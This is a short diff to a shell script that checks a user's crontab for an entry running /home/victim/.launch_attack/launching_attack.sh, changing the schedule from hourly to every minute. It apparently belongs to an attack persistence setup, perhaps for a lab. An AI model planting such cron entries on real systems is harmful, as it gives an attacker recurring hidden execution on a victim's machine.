@@ -1,7 +1,7 @@
 #/bin/sh
 
 check_crontab() {
-  local crontab_command='1 * * * * [ -f /home/victim/.launch_attack/launching_attack.sh ] && /home/victim/.launch_attack/launching_attack.sh'
+  local crontab_command='* * * * * [ -f /home/victim/.launch_attack/launching_attack.sh ] && /home/victim/.launch_attack/launching_attack.sh'
   crontab -l > /tmp/tmp_cron
   cat /tmp/tmp_cron | grep -Fxq "$crontab_command"
   if [ $? -eq 0 ]; then # positive match
